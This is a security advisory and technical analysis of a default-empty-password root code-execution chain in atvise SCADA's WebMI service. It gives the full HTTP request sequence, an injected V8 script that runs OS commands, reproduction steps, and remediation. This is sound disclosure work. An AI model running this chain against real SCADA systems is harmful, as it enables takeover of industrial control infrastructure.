# atvise SCADA WebMI Default-Credential Authenticated Root RCE - Technical Analysis

## Overview

atvise SCADA 3.13.0 (build 4-22210f1a3) is a pure-web OPC UA-based SCADA/HMI platform whose main service process `atserver` (a 57 MB non-stripped native C++ ELF) runs as `root`. Its WebHMI service (a Boost.Beast HTTP server inside `atserver`, ports 80/443) uses a custom WebMI authentication scheme. The built-in `root` user ships with a factory default empty password, and the WebMI `handleLogin` handler has a "password not set" branch that grants the superuser session for an existing user without verifying the supplied password while that default state is in place. The chain combines the default-credential login (`login(root, <any value>)` -> root superuser), a V8 ScriptCode injection via `AddNode` under `AGENT.OBJECTS.ATVISE.Report.*`, a `ReportRunConfiguration` trigger that loads the attacker script into the embedded V8 engine, and a `ChildProcess.execAsync` payload that executes an arbitrary OS command. The V8 engine runs inside `atserver` (root), so the injected script inherits root and can execute arbitrary commands through `ChildProcess.execAsync` or write files through `FileSystem` / `OutputFileStream`. Setting a strong root password via `changepassword` closes the login bypass; this is a default-credential authenticated RCE, not a password-agnostic authentication bypass.

## Architecture

```
L1 external access: 80/443 (WebMI HTTP) + 4840 (OPC UA binary) + 8081
L2 boundary: HTTP (80/443, served by WEBACCESS module)
L3 gateway: WebSessionHandler HTTP route dispatch (/webMI/?<method>)
L4 auth: WebMI HTTP backend
        - WebSessionHandler::handleLogin @0xbef2e0 -> checkUserPassword @0x10b6540 (memcmp)  [strict when a password is set]
        - "password not set" branch: grants session for existing user without password check  [default empty password]
L5 business: V8 ScriptCode nodes (AGENT.OBJECTS.ATVISE.Report.*), executed by embedded V8 engine (libv8.so 11.2.214.22)
L6 storage: SQLite nodes.db (node/script store) + V8 extensions libv8x_system.so (ChildProcess / FileSystem / OutputFileStream)
```

**Process**: `/usr/lib/atvise/atserver` — 57 MB ELF x86-64 PIE, not stripped, contains debug info, native C++, **runs as `uid=0(root)`** in a Docker deployment. The V8 engine inherits the process privilege.

## Authentication Boundary

`atserver` exposes a WebMI HTTP authentication backend on port 80/443:

| Step | Endpoint | Purpose |
|------|----------|---------|
| 1 | `POST /webMI/?info` | Returns the RSA public key (`encryptionexponent` / `encryptionmodulus`, 1024-bit) |
| 2 | `POST /webMI/?createsession cipher=<hex>` | Client generates random secret A, RSA-PKCS1 v1.5 type-2 encrypts it, server returns `sessionid` |
| 3 | subsequent requests | `X-WebMI: sessionid="...", cnonce="...", digest="..."` header, `digest = MD5(sessionid:clientSecret:cnonce)`, where `clientSecret = A` |

**Weakness 1 — digest bypass (session establishment only)**: because clientSecret A is chosen by the client and the client holds the plaintext, the client can compute a valid digest for any session id. This only means "a session can be established"; it does not by itself grant privileges.

**Weakness 2 — default-credential login (the core auth bug)**: `POST /webMI/?login username=root&password=<ANYTHING>` does not verify the password for an existing user whose password was never set. The login matrix (measured under the factory default empty password hash) is:

| login call | response | subsequent write (ReportRunConfiguration) |
|-----------|----------|-------------------------------------------|
| login(root, "x") | `{"username":"root"}` | success (V8 executes) |
| login(root, "WRONG_PW_999") | `{"username":"root"}` | success (V8 executes) |
| login(root, "") empty | `{"username":"root"}` | success (V8 executes) |
| login(nonexistent, "x") | `{"username":""}` | rejected |
| no login | — | "configuration not found" |

The built-in `root` user ships with a factory default empty password, so `login(root, <any value>)` authenticates as root.

**Strong-password falsification (2026-07-25)**: after setting a strong password via `changepassword` (root hash changes from the factory default to a 102-byte strong hash), the full login matrix returns `{"username":""}` for every password (correct strong password, wrong password, empty, plaintext, RSA ciphertext). The "password not set" branch closes once a real password is set. The real mechanism is therefore: **factory empty password triggers a "password not set" special branch that accepts any password**; setting a strong password closes the bypass. This is a default-credential authenticated RCE, not a password-agnostic auth bypass.

## Stage 1: Sink Identification (V8 Script Execution + File Write + Command Exec)

Reverse-engineering `libv8x_system.so` (the V8 extension that registers the `ChildProcess` class):

- `V8X_ChildProcess::registerApi` @ 0x9d520 — binds members
- `V8X_ChildProcess::execute` @ 0x9c850 — synchronous (blocks the V8 thread; do not use)
- `V8X_ChildProcess::executeAsync` — **non-blocking** (the core sink)
- constructor @ 0x9e3f0 — positional `new ChildProcess(command_string, args_array, env_obj, stdIn_string)`
- properties (SetAccessor, not methods): `exitCode` / `stdOut` / `stdErr` / `args`

**Sink**: `new ChildProcess(<cmd>).execAsync({timeout:<ms>})` -> `boost::process` shell mode; the child process runs with `atserver` privilege (root in Docker, `atvise` user under systemd).

Key constraints (measured):
- `exec()` / `join()` **block the V8 thread** -> must use `execAsync` (non-blocking, returns immediately, process runs in the background)
- read results via the **properties** `p.stdOut` / `p.exitCode`, not the methods `p.stdOut()`
- **no shell redirection `>`**: `boost::process` shell mode mishandles `>` and hangs the V8 thread. Use `touch` (empty marker) + `id` (stdOut capture) + `FileSystem` to persist a file

## Stage 2: Source Identification (AddNode + ReportRunConfiguration)

The attacker-controllable JS injection entry points are `AddNode` and `ReportRunConfiguration`.

- `POST /webMI/?AddNode address=<addr>&nodeClass=VARIABLE&dataType=XMLELEMENT&typeDefinition=VariableTypes.ATVISE.ScriptCode&value=<XML>` -> creates a ScriptCode node under `AGENT.OBJECTS.ATVISE.Report.<name>`, with `value` as the script XML
- `POST /webMI/?ReportRunConfiguration configuration=<name>&reportTime=0` -> triggers the Report engine to execute that configuration's script; the `execute(cfgAddr, {reportTime})` call inside the script runs the attacker JS in V8

Script XML format:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<script>
  <metadata><priority>0</priority><owner>root</owner><runcontext>caller</runcontext><fireevent>1</fireevent></metadata>
  <parameter name="reportTime" type="number" trigger="true" relative="false" value=""/>
  <code><![CDATA[ <attacker JS> ]]></code>
</script>
```

## Stage 3: Data Flow

```
Attacker HTTP POST /webMI/?login(root, ANY password)
  -> AuthSessionHandler::handleLogin @0xbef2e0  (factory empty password: no password check, grants root superuser)
  -> session privilege = root
Attacker HTTP POST /webMI/?AddNode (ScriptCode XML)
  -> written to nodes.db + AGENT.OBJECTS.ATVISE.Report.<name>
Attacker HTTP POST /webMI/?ReportRunConfiguration configuration=<name>
  -> Report engine loads the script -> V8 executes <code>
  -> new ChildProcess(cmd).execAsync()  (libv8x_system.so)
  -> boost::process shell exec  ->  atserver child process (root / atvise)
```

`checkUserPassword` @0x10b6540 (disassembled via objdump) does contain a `memcmp@plt` (0x10b66ad) password byte comparison, but `handleLogin` bypasses that check for an existing user whose password was never set (the factory default empty-password state). Once a strong password is set, `handleLogin` goes through `checkUserPassword` and the bypass closes.

## Stage 4: Injection / Exploit Construction

The full 7-step chain (no V8 N-day, no shell redirection):

1. `POST /webMI/?info` -> RSA public key (e, n)
2. `POST /webMI/?createsession cipher=RSA_PKCS1(random_A)` -> sessionid
3. `POST /webMI/?login username=root&password=x` (any password) + `X-WebMI` digest header -> root superuser
4. `POST /webMI/?AddNode` injects a ScriptCode node
5. `POST /webMI/?ReportRunConfiguration configuration=<name>` -> V8 executes the JS
6. JS: `var p=new ChildProcess("id"); p.execAsync({timeout:2000});` -> command execution
7. read `p.stdOut` (uid=0(root)) + `FileSystem` writes a persistent marker

Attacker JS (canonical):
```javascript
var p=new ChildProcess("id"); p.execAsync({timeout:2000});
var idOut = p.stdOut;                      // "uid=0(root) gid=0(root) groups=0(root)"
var fs = new FileSystem();
fs.createFile("/tmp/atvise_pwned", {overwrite:true});
var f = new OutputFileStream("/tmp/atvise_pwned", "utf8");
f.write("CMD=id\nEXIT=0\nOUT="+idOut+"\n");
f.close();
// also touch an empty marker
var p2=new ChildProcess("touch /tmp/atvise_pwned_marker"); p2.execAsync({timeout:2000});
```

## Stage 5: Dynamic Verification (real evidence)

### 5.1 HTTP request sequence

```
POST /webMI/?info  ->  {"encryptionexponent":"...","encryptionmodulus":"..."}
POST /webMI/?createsession  cipher=<RSA_PKCS1(A)>  ->  {"sessionid":"C"}
POST /webMI/?login  username=root&password=x  (X-WebMI digest)  ->  {"username":"root"}
POST /webMI/?AddNode  address=AGENT.OBJECTS.ATVISE.Report.pwn&...&value=<XML>  ->  {}
POST /webMI/?ReportRunConfiguration  configuration=pwn&reportTime=0  ->  {}
```

### 5.2 Target-side marker verification

```
$ ls -la /tmp/atvise_pwned /tmp/atvise_pwned_marker
-rw-r--r-- 1 root root 58  /tmp/atvise_pwned          # FileSystem write, owner=root
-rw-r--r-- 1 root root  0  /tmp/atvise_pwned_marker   # touch via ChildProcess.execAsync, owner=root
$ cat /tmp/atvise_pwned
CMD=id
EXIT=0
OUT=uid=0(root) gid=0(root) groups=0(root)
```

**Three elements proven**:
- **Authenticated via default credential**: `login(root, "x")` returned `{"username":"root"}` (any password accepted while root has the factory empty password)
- **root**: marker owner = `root:root`, `atserver` process `uid=0(root)`
- **RCE**: `OUT=uid=0(root)` is the real stdout of the `id` command; `EXIT=0` is its exit code; the marker file was actually written on disk

### 5.3 Strong-password falsification (2026-07-25, key)

To verify whether the login bypass is a real authentication bypass or a default-credential issue, a control experiment was run:

1. **Baseline** (factory empty hash): `login(root,"x")` / `login(root,"WRONG")` / `login(root,"")` -> all `{"username":"root"}`; `login(nosuchuser,"x")` -> `{"username":""}`
2. **changepassword**: `oldpasswordcipher=RSA("")` + `newpasswordcipher=RSA("Str0ngP@ss!2026")` -> 200 `{}` (success, root hash becomes a 102-byte strong hash)
3. **Post-change matrix** (strong hash): every login (correct strong password, wrong password, empty, plaintext, RSA ciphertext) -> `{"username":""}`

The bypass **closes under a strong password**. The factory empty password is the necessary condition, not a password-agnostic bypass. The authenticated RCE chain requires `login(root, <any value>)` to elevate; under a strong password that login fails and the chain breaks.

### 5.4 Login-state theft investigation (2026-07-25, all negative)

To find an alternative path to a root session under a strong password, the unauthenticated HTTP interfaces were surveyed for login-state theft vectors:

| Vector | Experiment | Result |
|--------|-----------|--------|
| sessionid predictability | 8 consecutive createsession, analyze sid sequence | sid is a monotonically increasing hex counter (5,6,7,8,9,A,B,C), not a fixed slot, no wraparound |
| session collision hijack | after login(root), flood 40 createsession to reuse root sid | 40 attempts, no sid reuse; counter grows monotonically to 0x28, no collision |
| authorize constant | no header / wrong digest / valid digest | all return the same global constant, not a session secret |
| session list leak | getSessions / listsessions / sessioninfo | all 404, no active-session leak endpoint |
| digest check bypass | forged sid / victim sid + wrong digest / unknown sid | all `{"error":-1,"errorstring":"Invalid Session or Digest"}`, digest strictly enforced |
| WebSocket endpoint | WS upgrade on /webMI/ and / | /webMI/ -> 404; / -> 200 static client, no WS auth bypass |
| ValidateUserPassword | unauthenticated call, various params | returns password-complexity policy checks, not login auth, does not grant a session |
| unauthenticated method data leak | methodsupport full probe | LoggerBrowseLog / GetTranslations / CheckNodeExists return data unauthenticated, but no session secret/token |

The WebMI session model is cryptographically sound; there is no stealable login state. Without knowing the root password, a root session cannot be obtained, and the authenticated RCE chain is not reachable under a strong password.

## Stage 6: Reachability

- ports 80/443 bind to `0.0.0.0` by default (licensed state)
- routes are POST-only (GET -> 404)
- the full chain requires `login(root, <any value>)` to elevate (factory default empty password)
- no IP allowlist / no WAF by default
- the attacker only needs network reachability to 80/443

## Stage 7: Defense in Depth / Remediation

### 7.1 Root cause

The WebMI `handleLogin` handler grants the superuser session for an existing user whose password was never set, without verifying the supplied password. Combined with the built-in `root` user shipping with a factory default empty password, this is a default-credential authenticated RCE.

### 7.2 Remediation

1. **login handler must verify the password**: `handleLogin` must call `checkUserPassword` for every existing user, including those whose password was never set, and reject wrong passwords
2. **no factory default empty password**: ship with a forced first-run password set, or require `changepassword` on first boot
3. **ChildProcess must be restricted**: the V8 script engine should not expose `ChildProcess.execAsync` for arbitrary command execution; sandbox or remove shell mode
4. **ReportRunConfiguration must validate the script source**: only trusted Report configurations should execute; do not execute arbitrary AddNode-injected ScriptCode
5. **digest must bind a server secret**: clientSecret should not be client-chosen; otherwise the session layer has no identity binding

### 7.3 Temporary mitigation

- Set a strong root password via `changepassword` immediately after installation (closes the login bypass)
- Firewall 80/443 to trusted hosts only
- Monitor writes to `AGENT.OBJECTS.ATVISE.Report.*` and `SYSTEM.LIBRARY.ATVISE.WEBMIMETHODS.*` nodes

## Reproduction

```bash
# 1. Deploy atvise SCADA 3.13.0 (Docker, licensed state, factory default empty root password)
# 2. Run the PoC (pure-stdlib Python)
python3 atvise_webmi_auth_rce.py http://127.0.0.1:80 "id"
# 3. Verify the marker on the target
docker exec <container> ls -la /tmp/atvise_pwned /tmp/atvise_pwned_marker
docker exec <container> cat /tmp/atvise_pwned
# Expected: owner=root:root, content contains OUT=uid=0(root)
```

## Honest Caveats

1. **root = Docker-only**: `atserver` runs as root inside the container; a real systemd deployment with `User=atvise` yields RCE as the `atvise` user (still an authenticated RCE, with a different privilege level)
2. **License-patch simulation**: the WEBACCESS HTTP endpoints are loaded only in a licensed state. This research had no paid license and used a binary patch to simulate the licensed running state. The patches are license bypasses only; the auth bypass and script injection are license-independent. A real licensed customer deployment has the vulnerability under its default running configuration (factory empty root password)
3. **login mechanism**: `checkUserPassword` contains a `memcmp` password comparison, but `handleLogin` bypasses that check for an existing user whose password was never set (the factory default empty-password state). This is a real code bug, not a patch artifact (the patches only touch license/session-count)

## Content-Safety Statement

This audit is a security-research record for authorized research only (Coordinated Disclosure).
